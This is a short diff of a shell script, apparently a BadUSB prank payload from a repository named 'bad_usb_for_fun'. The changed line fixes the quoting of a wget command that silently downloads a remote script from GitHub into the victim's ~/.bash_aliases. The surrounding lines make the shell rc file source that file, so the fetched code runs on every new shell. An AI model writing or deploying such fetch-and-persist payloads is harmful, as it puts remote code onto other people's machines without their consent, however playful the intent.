@@ -9,7 +9,7 @@ if [ -f ~/.bash_aliases ]; then
 fi
 EOF
 )
-wget -q -O "~/.bash_aliases" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/tardis/tardis.sh"
+wget -q -O ~/.bash_aliases "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/tardis/tardis.sh"
 if ! grep -q 'if \[ -f ~/.bash_aliases \]; then' "$B"; then
     echo -e "\n$AB" >> "$B"
 fi
